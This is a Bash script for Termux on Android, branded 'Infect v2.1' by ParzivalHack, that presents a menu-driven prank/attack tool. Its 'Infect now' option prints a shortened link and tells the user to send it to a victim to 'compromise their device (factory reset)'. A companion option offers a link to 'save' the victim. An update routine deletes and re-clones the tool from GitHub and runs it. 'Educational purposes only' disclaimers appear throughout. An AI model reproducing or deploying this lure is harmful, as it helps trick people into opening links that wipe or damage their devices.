red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.1      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                      ⫸$ylo  Coded by ParzivalHack$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR OF THIS TOOL IT'S NOT RESPONSIBLE FOR ANY DAMAGE TO DEVICES NOR PEOPLE😇✌️]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.2      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Noob Hackers
'
echo " " 
echo -e "$red                      ⫸$ylo Coded by ParzivalHack$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [FOR EDUCATIONAL PURPOSES ONLY. THE AUTHOR OF THIS TOOL IT'S NOT RESPONSIBLE FOR ANY DAMAGE TO DEVICES NOR PEOPLE😇✌️]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Check out my VPN"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
upd
elif [ $optnz = "5" ];
then
am start -a android.intent.action.VIEW -d www.whispervpn.company.site > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://github.com/ParzivalHack > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m 😈  Copy the link below and send it to your victim
to compromise their device (factory reset).
                                👇👇👇
         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
                                 👆👆👆
FOR EDUCATIONAL PURPOSES ONLY. 
THE AUTHOR OF THIS TOOL IT'S NOT RESPONSIBLE 
FOR ANY DAMAGE TO DEVICES NOR PEOPLE😇✌️"
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo " "
echo -e "\e[93m  Copy the link below and send it 
to your infected victim to save their device.
                    👇👇👇
        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
                    👆👆👆
FOR EDUCATIONAL PURPOSES ONLY. 
THE AUTHOR OF THIS TOOL IT'S NOT RESPONSIBLE 
FOR ANY DAMAGE TO DEVICES NOR PEOPLE😇✌️"
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
'
echo -e "\e[93m        MY GITHUB:\e[92m www.github.com/ParzivalHack\e[0m" | pv -qL 10
echo -e "\e[93m        MY VPN WEBSITE:\e[92m www.whispervpn.company.site\e[0m" | pv -qL 10
echo -e "\e[92m                BYE :D" | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/doomshell" ];
then
cd $HOME
rm -rf doomshell
elif [ -d "$HOME/doomshell" ];
then
cd $HOME
rm -rf doomshell
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE BE PATIENT...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/ParzivalHack/doomshell 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATED SUCCESSFULLY TO THE LATEST VERSION!\e[0m"
sleep 2.0
cd $HOME
cd doomshell
bash doomshell.sh
}
vid(){
FILE=$HOME/doomshell
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d ERROR000 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/doomshell
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu
